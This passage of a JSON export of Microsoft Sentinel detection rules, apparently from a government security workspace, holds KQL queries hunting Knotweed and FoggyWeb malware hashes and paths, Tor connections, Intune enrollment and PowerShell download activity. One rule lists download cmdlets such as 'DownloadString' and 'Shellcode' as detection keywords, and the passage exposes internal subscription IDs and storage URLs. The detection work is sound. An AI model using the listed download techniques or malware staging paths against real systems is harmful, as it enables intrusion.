malware  \n    \"fd6515a71530b8329e2c0104d0866c5c6f87546d4b44cc17bbb03e64663b11fc\", // SHA-256 Jumplump malware  \n    \"5d169e083faa73f2920c8593fb95f599dad93d34a6aa2b0f794be978e44c8206\", // SHA-256 Jumplump malware  \n    \"7f29b69eb1af1cc6c1998bad980640bfe779525fd5bb775bc36a0ce3789a8bfc\", // SHA-256 Jumplump malware  \n    \"02a59fe2c94151a08d75a692b550e66a8738eb47f0001234c600b562bf8c227d\", // SHA-256 Jumplump malware  \n    \"7f84bf6a016ca15e654fb5ebc36fd7407cb32c69a0335a32bfc36cb91e36184d\", // SHA-256 Jumplump malware  \n    \"afab2e77dc14831f1719e746042063a8ec107de0e9730249d5681d07f598e5ec\", // SHA-256 Jumplump malware  \n    \"894138dfeee756e366c65a197b4dbef8816406bc32697fac6621601debe17d53\", // SHA-256 Jumplump malware  \n    \"4611340fdade4e36f074f75294194b64dcf2ec0db00f3d958956b4b0d6586431\", // SHA-256 Jumplump malware  \n    \"7f29b69eb1af1cc6c1998bad980640bfe779525fd5bb775bc36a0ce3789a8bfc\", // SHA-256 Jumplump malware  \n    \"c96ae21b4cf2e28eec222cfe6ca903c4767a068630a73eca58424f9a975c6b7d\", // SHA-256 Corelump malware  \n    \"fa30be45c5c5a8f679b42ae85410f6099f66fe2b38eb7aa460bcc022babb41ca\", // SHA-256 Mex tool  \n    \"e64bea4032cf2694e85ede1745811e7585d3580821a00ae1b9123bb3d2d442d6\"  // SHA-256 Passlib tool  \n    ]);\nlet guids = dynamic([\n    \"{ddc05a5a-351a-4e06-8eaf-54ec1bc2dcea}\",\n    \"{1f486a52-3cb1-48fd-8f50-b8dc300d9f9d}\",\n    \"{4590f811-1d3a-11d0-891f-00aa004b2e24}\", \n    \"{4de225bf-cf59-4cfc-85f7-68b90f185355}\", \n    \"{F56F6FDD-AA9D-4618-A949-C1B91AF43B1A}\"\n    ]); \nlet signInLookup = (\nSigninLogs\n| where TimeGenerated >= ago(1d)\n| where DeviceDetail contains \"displayName\"\n| extend DeviceDetailJson = parse_json(DeviceDetail)\n| extend DeviceNameSI = tostring(DeviceDetailJson.displayName)\n| distinct DeviceNameSI, UserPrincipalName, UserDisplayName\n);\n(union isfuzzy=True\n    (\n    union withsource=TableName Device* \n    | where SHA256 in (hashes)\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        timestamp = TimeGenerated,\n        AccountCustomEntity = UserPrincipalName,\n        HostCustomEntity = DeviceName,\n        FileHashCustomEntity = SHA256\n    ),\n    (\n    EmailAttachmentInfo\n    | where SHA256_s in (hashes)\n    | project\n        timestamp = TimeGenerated,\n        AccountCustomEntity = SenderFromAddress_s,\n        FileHashCustomEntity = SHA256_s\n    ),\n    (\n    DeviceNetworkEvents \n    | where RemoteUrl has_any(c2domains)\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        timestamp = TimeGenerated,\n        IPCustomEntity = RemoteIP,\n        AccountCustomEntity = UserPrincipalName,\n        HostCustomEntity = DeviceName, \n        UrlCustomEntity = RemoteUrl\n    ),\n    (\n    DeviceFileEvents\n    | where ActionType == \"FileCreated\" \n    | where FolderPath has \"C:\\\\Windows\\\\System32\\\\spool\\\\drivers\\\\color\\\\\" \n    | where FileName endswith \".exe\" or FileName endswith \".dll\"\n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project timestamp = TimeGenerated, \n        HostCustomEntity = DeviceName, \n        AccountCustomEntity = UserPrincipalName,\n        InitiatingProcessAccountName, \n        ProcessCustomEntity = InitiatingProcessFileName, \n        FileHashCustomEntity = InitiatingProcessSHA256,  \n        CommandLine = InitiatingProcessCommandLine,\n        Image = InitiatingProcessFolderPath\n    ),\n    (\n    DeviceRegistryEvents \n    | where ActionType == \"RegistryValueSet\" \n    | where RegistryKey startswith \"HKEY_LOCAL_MACHINE\\\\SOFTWARE\\\\Classes\\\\CLSID\" \n    | where RegistryKey has_any (guids) \n    | where RegistryValueData has \"System32\\\\spool\\\\drivers\\\\color\" \n    | extend SILogDeviceName = toupper((split(DeviceName, \".\"))[0])\n    | join kind=leftouter signInLookup on $left.SILogDeviceName == $right.DeviceNameSI\n    | project\n        timestamp = TimeGenerated,\n        HostCustomEntity = DeviceName,\n        AccountCustomEntity = UserPrincipalName,\n        InitiatingProcessAccountName,\n        ProcessCustomEntity = InitiatingProcessFileName,\n        RegistryKey,\n        RegistryValueData\n    )\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"FileHashCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]},{"entityType":"URL","fieldMappings":[{"identifier":"Url","columnName":"UrlCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution","InitialAccess","Persistence","PrivilegeEscalation"],"techniques":["T1204","T1566","T1546"],"displayName":"BAH_KNOTWEED","enabled":true,"description":"Detectes activity based on Knotweed campain. For more infromation see https://www.microsoft.com/security/blog/2022/07/27/untangling-knotweed-european-private-sector-offensive-actor-using-0-day-exploits/\nPLATFORM:Windows\nMITRE:TA0001;T1566;T1566.002;T1566.003,TA0002;T1204,TA0003;T1546,TA0004;T1546","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:29:53.396987Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/1bf328d3-ce67-4c91-bb3d-7feed2537bab","name":"1bf328d3-ce67-4c91-bb3d-7feed2537bab","etag":"\"8700f2be-0000-2700-0000-66fdc82d0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT30M","queryPeriod":"PT30M","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"// Author: Rob Russell\n// Description: \n// ATT&CK Techniques: Collection T1005\n// adjusted for CSSP environment on 8/5/2022\n// downloadable IOC list has not been updated since 2021 so it is now hardcoded into analytic\n// Based on analytic published by MS here:\n// https://github.com/Azure/Azure-Sentinel/blob/6eddef69744c33eee7738d3043b2bd0184ae7583/Detections/MultipleDataSources/Nobelium_FoggyWeb.yaml\n// requires ADFS servezrs to be hardcoded into analytic\n//Identifies a match across various data feeds for IOCs related to FoggyWeb backdoor by the threat actor NOBELIUM. FoggyWeb is a passive and highly targeted backdoor capable of remotely exfiltrating sensitive information from a compromised AD FS server. It can also receive additional malicious components from a command-and-control (C2) server and execute them on the compromised server. Reference: https://aka.ms/nobelium-foggy-web\n// False Positives: Since this is based on IOC all alerts should be investigated\nlet iocs = datatable(DateAdded:string,IoC:string,Type:string, TLP:string)[\n\"10/22/2021\",\"231b5517b583de102cde59630c3bf938155d17037162f663874e4662af2481b1\",\"sha256\",\"White\",\n\"10/22/2021\",\"da0be762bb785085d36aec80ef1697e25fb15414514768b3bcaf798dd9c9b169\",\"sha256\",\"White\",\n\"10/22/2021\",\"568392bd815de9b677788addfc4fa4b0a5847464b9208d2093a8623bbecd81e6\",\"sha256\",\"White\",\n\"10/22/2021\",\"Windows\\\\SystemResources\\\\Windows.Data.TimeZones\\\\pris\\\\Windows.Data.TimeZones.zh-PH.pri\",\"FilePath\",\"White\",\n\"10/22/2021\",\"Windows\\\\ADFS\\\\version.dll\",\"FilePath\",\"White\",\n\"10/22/2021\",\"/adfs/services/trust/2005/samlmixed/upload\",\"URI1\",\"White\",\n\"10/22/2021\",\"/adfs/portal/images/theme/light01/profile.webp\",\"URI2\",\"White\",\n\"10/22/2021\",\"/adfs/portal/images/theme/light01/logo.webp\",\"URI2\",\"White\",\n\"10/22/2021\",\"/adfs/portal/images/theme/light01/background.webp\",\"URI2\",\"White\"\n];\nlet sha256Hashes = (iocs | where Type == \"sha256\" | project IoC);\nlet FilePaths = (iocs | where Type =~ \"FilePath\" | project IoC);\nlet POST_URI = (iocs | where Type =~ \"URI1\" | project IoC);\nlet GET_URI = (iocs | where Type =~ \"URI2\" | project IoC);\n//Include in the list below, the ADFS servers you know about in your environment.  In the next part of the query, we will try to identify them for you if you have the telemetry.\nlet ADFS_Servers1 = externaldata(Computer:string)\n[@\"https://dod365csspstorage.blob.core.usgovcloudapi.net/adfs/ADFS.csv\"]\nwith(format=\"csv\", ignoreFirstRecord=true);\n// Automatically identify potential ADFS services in your environment by searching process event telemetry for \"Microsoft.IdentityServer.ServiceHost.exe\".\nlet ADFS_Servers2 = \n(DeviceProcessEvents\n| where InitiatingProcessFileName == 'Microsoft.IdentityServer.ServiceHost.exe'\n| extend Computer = DeviceName\n| distinct Computer\n);\nlet ADFS_Servers =\nADFS_Servers1\n| union  (ADFS_Servers2 | distinct Computer);\n(union isfuzzy=true\n(DeviceNetworkEvents\n| where DeviceName in (ADFS_Servers)\n| where isnotempty(InitiatingProcessSHA256) or isnotempty(InitiatingProcessFolderPath)\n| where  InitiatingProcessSHA256 has_any (sha256Hashes) or InitiatingProcessFolderPath has_any (FilePaths)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId,  InitiatingProcessParentFileName, InitiatingProcessFileName, RemoteIP, RemoteUrl, RemotePort, LocalIP, Type\n| extend timestamp = TimeGenerated, IPCustomEntity = RemoteIP, HostCustomEntity = DeviceName\n),\n(DeviceEvents\n| where DeviceName in (ADFS_Servers)\n| extend FilePath = strcat(FolderPath, '\\\\', FileName)\n| where InitiatingProcessSHA256 has_any (sha256Hashes) or FilePath has_any (FilePaths)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(DeviceFileEvents\n| where DeviceName in (ADFS_Servers)\n| where FolderPath has_any (FilePaths) or SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n),\n(DeviceImageLoadEvents\n| where DeviceName in (ADFS_Servers)\n| where FolderPath has_any (FilePaths) or SHA256 has_any (sha256Hashes)\n| project TimeGenerated, ActionType, DeviceId, DeviceName, InitiatingProcessAccountDomain, InitiatingProcessAccountName, InitiatingProcessCommandLine, InitiatingProcessFolderPath, InitiatingProcessId, InitiatingProcessParentFileName, InitiatingProcessFileName, InitiatingProcessSHA256, Type\n| extend Account = InitiatingProcessAccountName, Computer = DeviceName, CommandLine = InitiatingProcessCommandLine, FileHash = InitiatingProcessSHA256, Image = InitiatingProcessFolderPath\n| extend timestamp = TimeGenerated, HostCustomEntity = Computer , AccountCustomEntity = Account, ProcessCustomEntity = InitiatingProcessFileName, AlgorithmCustomEntity = \"SHA256\", FileHashCustomEntity = FileHash\n)\n)","suppressionDuration":"PT5H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"FileHash","fieldMappings":[{"identifier":"Value","columnName":"FileHashCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["CommandAndControl","Collection","DefenseEvasion","Exfiltration","Discovery","PrivilegeEscalation","Persistence","Execution","CredentialAccess","LateralMovement"],"techniques":["T1071","T1573","T1105","T1560","T1005","T1140","T1574","T1036","T1027","T1620","T1550","T1041","T1083","T1040","T1057","T1106","T1129","T1552"],"displayName":"BAH_NOBELIUM IOCs related to FoggyWeb backdoor","enabled":true,"description":"Identifies a match across various data feeds for IOCs related to FoggyWeb backdoor by the threat actor NOBELIUM. FoggyWeb is a passive and highly targeted backdoor capable of remotely exfiltrating sensitive information from a compromised AD FS server. It can also receive additional malicious components from a command-and-control (C2) server and execute them on the compromised server. Reference: https://aka.ms/nobelium-foggy-web                                                https://attack.mitre.org/software/S0661/         \n                                                                                                                                                                                                                                                                                                                                                                                                                                                          T1071 - Application Layer Protocol:T1071.001, T1560 - Archive Collected Data:T1560.002,T1560.003, T1005-Data from Local System, T1140-Deobfuscate/Decode Files or Information, T1573-Encrypted Channel:T1573.001, T1041-Exfiltration Over C2 Channel, T1083-File and Directory Discovery, T1574-Hijack Execution Flow:T1574.001, T1105-Ingress Tool Transfer, T1036-Masquerading:T1036.005, T1106-Native API, T1040-Network Sniffing, T1027-Obfuscated Files or Information:T1027.004, T1057\t-Process Discovery, T1620-Reflective Code Loading, T1129-Shared Modules, T1552-Unsecured Credentials:T1552.004, T1550-Use Alternate Authentication Material\nPLATFORM:Windows\nMITRE:TA0009;T1005","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:24:44.3165945Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/DoD365-LAW-RG2/providers/Microsoft.OperationalInsights/workspaces/DOD365-LAW/providers/Microsoft.SecurityInsights/alertRules/d53acf5e-429e-479c-ba8b-4109a3e1098c","name":"d53acf5e-429e-479c-ba8b-4109a3e1098c","etag":"\"3308c5c3-0000-2700-0000-67360e390000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P1D","queryPeriod":"P1D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Steven Wan and Shawn McWhirter\n//Descripton: This query detects processes communicating with known Tor relay IP addresses.\n//False Positives: None known\nlet TorRelayData = (\n    externaldata (Nickname: string, Fingerprint: string, EntryAddress: string, IPAddress: string, Port: string, AddressType: string, Hostname: string, CountryCode: string, IsRunning: bool, LastChangedIPData: string)\n    [h@'https://torinfo.blob.core.windows.net/public/TorRelayIPs.csv'] with (ignoreFirstRecord=true, format=\"csv\")\n    | where AddressType == \"IPv4\"\n    | join kind=inner DeviceNetworkEvents on $left.IPAddress == $right.RemoteIP\n    | join kind=inner (DeviceInfo\n    | distinct DeviceId, PublicIP)\n    on DeviceId\n    );\n    TorRelayData\n    | summarize count() by bin(TimeGenerated, 10m),\n    AccountCustomEntity = InitiatingProcessAccountName,\n    HostCustomEntity = DeviceName,\n    DeviceId,\n    IPCustomEntity = LocalIP,\n    RemoteIP,\n    LocalPublicIP = PublicIP,\n    TorIP = IPAddress,\n    TorHostName = Hostname,\n    TorCountryCode = CountryCode,\n    ActionType,\n    InitiatingProcessFileName,\n    InitiatingProcessFolderPath,\n    Tactic = \"ToR IP address activity, either successful connection or mulitple connection attempts\"\n    | where (count_ >5 and ActionType == \"ConnectionAttempt\") or ActionType == \"ConnectionSuccess\"","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":null,"groupByCustomDetails":null}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"Host","fieldMappings":[{"identifier":"FullName","columnName":"HostCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]},{"entityType":"File","fieldMappings":[{"identifier":"Name","columnName":"ActionType"},{"identifier":"Directory","columnName":"RemoteIP"}]}],"tactics":["CommandAndControl","Discovery"],"techniques":["T1071","T1090"],"displayName":"BAH_Defender-DetectTorRelayConnectivity","enabled":true,"description":"This advanced hunting query detects processes communicating with known Tor relay IP addresses.","alertRuleTemplateName":null,"lastModifiedUtc":"2024-11-14T14:50:29.388722Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8ffe5882-b68d-4e8c-8195-e2d62ca792b3","name":"8ffe5882-b68d-4e8c-8195-e2d62ca792b3","etag":"\"0c0145df-0000-2700-0000-6400b0a70000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\n//Description: This analytic looks for two PowerShell cmdlets that create and remove Client Access rules.\n//False Positives: Can alert on legitimate changes, but should still be investigated to confirm.\nOfficeActivity\n| where Operation has_any(\"Remove-ClientAccessRule\", \"New-ClientAccessRule\")\n| project TimeGenerated, Operation, UserId, ClientIP, Parameters","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"AadUserId","columnName":"UserId"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"ClientIP"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T0807"],"displayName":"BAH_TCG-ClientAccessRules","enabled":true,"description":"This analytic looks for two PowerShell cmdlets that create and remove Client Access rules.","alertRuleTemplateName":null,"lastModifiedUtc":"2023-03-02T14:20:22.5051545Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/a0efd706-a3bf-419d-9c88-a665adf4196f","name":"a0efd706-a3bf-419d-9c88-a665adf4196f","etag":"\"8700ccd3-0000-2700-0000-66fdc9a40000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Stephen Rowley\n//Description: Looks for Intune enrollment attempts from users that are not a part of a list of authorized users.\n//False Positives: None known\nlet approved_delegates =\n    externaldata(UPN: string, UID: string)\n    [@\"https://dod365csspstorage.blob.core.usgovcloudapi.net/uem-pilot-users/pilotusers.csv\"]\n    with(format=\"csv\", ignoreFirstRecord=true);\nlet userids = (approved_delegates\n    | project UID);\nlet intuneCAP = dynamic([\"BYOAD Intune Pilot Compliance based Conditional Access\", \"Allow Intune Enrollment for Test Users\", \"TEST - AADJ Block All Intune Enrollment\", \"TEST - Allow AADJ Intune Enrollment (MacOS/Windows/Android/IOS)\"]);\nSigninLogs\n| where AppDisplayName has \"intune\"\n| where not(UserId has_any(userids))\n| where ConditionalAccessStatus =~ \"failure\"\n| mv-expand ConditionalAccessPolicies // creates entry for every CAP policy\n| where ConditionalAccessPolicies.displayName has_any (intuneCAP)\n| extend\n    StatusCode = tostring(Status.errorCode),\n    StatusDetails = tostring(Status.additionalDetails)\n| extend Status = strcat(StatusCode, \": \", ResultDescription) // merge status code and meaning\n| project\n    TimestampCustomEntity = TimeGenerated,\n    AccountCustomEntity = UserPrincipalName,\n    UserId,\n    OS = tostring(DeviceDetail.operatingSystem),\n    Browser = tostring(DeviceDetail.browser),\n    UserAgent,\n    CAPDisplayName = tostring(ConditionalAccessPolicies.displayName),\n    IPCustomEntity = IPAddress,\n    Status,\n    StatusDetails,\n    CorrelationId","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]},{"entityType":"IP","fieldMappings":[{"identifier":"Address","columnName":"IPCustomEntity"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["InitialAccess"],"techniques":["T1200","T1199"],"displayName":"BAH_Intune_Unauthorized_Enrollment_Attempts","enabled":false,"description":"Looks for Intune enrollment attempts from users that are not a part of a list of authorized users\nPLATFORM:Microsoft 365,Windows,IaaS\nMITRE:T00001;T1199;T1200","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:31:00.1101016Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/8b21ed1d-4de1-40f9-a3d9-e08b3a26f347","name":"8b21ed1d-4de1-40f9-a3d9-e08b3a26f347","etag":"\"87006af4-0000-2700-0000-66fdcbbc0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT1H","queryPeriod":"PT1H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"Medium","query":"//Author: Steven Wan\r\n//Description: This analytic searches for data being downloaded through PowerShell using various cmdlets.\r\n//False Positives: Possibly will flag legitimate PowerShell download requests with users that have PowerShell access. This analytic is also known to alert when the MDE agent is downloading updated definitions. In the future, this analytic should be modified to create a defeat for MDE downloads.\r\nDeviceEvents \r\n| where ActionType == \"PowerShellCommand\"\r\n| where AdditionalFields has_any(\"Invoke-WebRequest\", \"WebClient\", \"DownloadFile\", \"DownloadData\", \"DownloadString\" \"WebRequest\", \"Shellcode\", \"http\", \"https\")\r\n| where not(InitiatingProcessAccountName has_any(\"system\", \"local service\"))\r\n| project TimeGenerated, InitiatingProcessAccountUpn, DeviceName, MachineGroup, FileName, ActionType, AdditionalFields, InitiatingProcessAccountName, InitiatingProcessCommandLine, ProcessCommandLine, InitiatingProcessFileName","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5M","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"Name","columnName":"InitiatingProcessAccountName"}]},{"entityType":"Host","fieldMappings":[{"identifier":"HostName","columnName":"DeviceName"}]}],"eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Exfiltration"],"techniques":["T1048"],"displayName":"BAH_Defender-PowerShellDownload","enabled":false,"description":"This analytic searches for data being downloaded through PowerShell using various cmdlets.\nPLATFORM:Windows\nMITRE:TA0010;T1048","alertRuleTemplateName":null,"lastModifiedUtc":"2024-10-02T22:39:56.0007951Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/b893b6d0-93b4-4ac7-bd93-3f3c7e5f1d69","name":"b893b6d0-93b4-4ac7-bd93-3f3c7e5f1d69","etag":"\"ed00a28d-0000-2700-0000-65f081ce0000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"PT6H","queryPeriod":"PT6H","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let AlertLinks = SecurityAlert\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n          Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n| extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| where UPN <> \"\"\n| summarize PreciousSecurityAlertLinks=make_set(AlertLink) by UPN;\nSecurityAlert\n| where ProductName == \"Microsoft 365 Insider Risk Management\"\n    | summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n    | mv-expand todynamic(Entities)\n    | where Entities[\"Type\"] =~ \"account\"\n    | extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = tostring(Entities[\"NTDomain\"]), UPNSuffix = tostring(Entities[\"UPNSuffix\"]), AadUserId = tostring(Entities[\"AadUserId\"]), AadTenantId = tostring(Entities[\"AadTenantId\"]), \n        Sid = tostring(Entities[\"Sid\"]), IsDomainJoined = tobool(Entities[\"IsDomainJoined\"]), Host = tostring(Entities[\"Host\"])\n    | extend UPN = iff(Name != \"\" and UPNSuffix != \"\", strcat(Name, \"@\", UPNSuffix), \"\")\n| extend Href_ = tostring(parse_json(ExtendedLinks)[0].Href)\n| join kind=inner (AlertLinks) on UPN\n| extend UserPrincipalName = UPN\n| extend PreviousAlertsLinks = strcat(PreciousSecurityAlertLinks)\n// | lookup kind=inner _GetWatchlist('<Your Watchlist Name>') on $left.UserPrincipalName == $right.SearchKey\n| project UserPrincipalName, AlertName, ProductName, Tactics, Status, AlertLink, PreviousAlertsLinks, TimeGenerated\n| sort by TimeGenerated desc\n| extend AccountCustomEntity = UserPrincipalName\n","suppressionDuration":"PT1H","suppressionEnabled":false,"incidentConfiguration":{"createIncident":true,"groupingConfiguration":{"enabled":false,"reopenClosedIncident":false,"lookbackDuration":"PT5H","matchingMethod":"AllEntities","groupByEntities":[],"groupByAlertDetails":[],"groupByCustomDetails":[]}},"entityMappings":[{"entityType":"Account","fieldMappings":[{"identifier":"FullName","columnName":"AccountCustomEntity"}]}],"templateVersion":"1.1.2","eventGroupingSettings":{"aggregationKind":"SingleAlert"},"tactics":["Execution"],"techniques":["T1204"],"displayName":"Insider Risk_Microsoft Purview Insider Risk Management Alert Observed","enabled":false,"description":"This alert is triggered when a Microsoft Purview Insider Risk Management alert is recieved in Microsoft Sentinel via the Microsoft Purview Insider Risk Management Connector. The alert extracts usernames from security alerts to provide UserPrincipalName, Alert Name, Reporting Product Name, Status, Alert Link, Previous Alerts Links, Time Generated. There is an option for configuration of correlations against Microsoft Sentinel watchlists. For more information, see [Learn about insider risk management](https://docs.microsoft.com/microsoft-365/compliance/insider-risk-management)","alertRuleTemplateName":"69660e65-0e5c-4700-8b99-5caf59786606","lastModifiedUtc":"2024-03-12T16:24:46.4597179Z"}},{"id":"/subscriptions/41de2c2e-1ec0-4d1b-b768-edd976cdd8fe/resourceGroups/dod365-law-rg2/providers/Microsoft.OperationalInsights/workspaces/dod365-law/providers/Microsoft.SecurityInsights/alertRules/4754c776-41b2-4f1e-ad9b-17b4fd54008d","name":"4754c776-41b2-4f1e-ad9b-17b4fd54008d","etag":"\"ed009a59-0000-2700-0000-65f081720000\"","type":"Microsoft.SecurityInsights/alertRules","kind":"Scheduled","properties":{"queryFrequency":"P7D","queryPeriod":"P7D","triggerOperator":"GreaterThan","triggerThreshold":0,"severity":"High","query":"let PreviousIncidents =\nSecurityIncident\n| summarize hint.strategy = shuffle arg_max(LastModifiedTime, *) by IncidentNumber\n| mv-expand AlertIds\n| extend AlertId = tostring(AlertIds)\n| join kind= innerunique ( \n          SecurityAlert \n          )\n          on $left.AlertId == $right.SystemAlertId\n| summarize hint.strategy = shuffle arg_max(TimeGenerated, *), NumberOfUpdates = count() by SystemAlertId\n| mv-expand todynamic(Entities)\n| where Entities[\"Type\"] =~ \"account\"\n| extend Name = tostring(tolower(Entities[\"Name\"])), NTDomain = 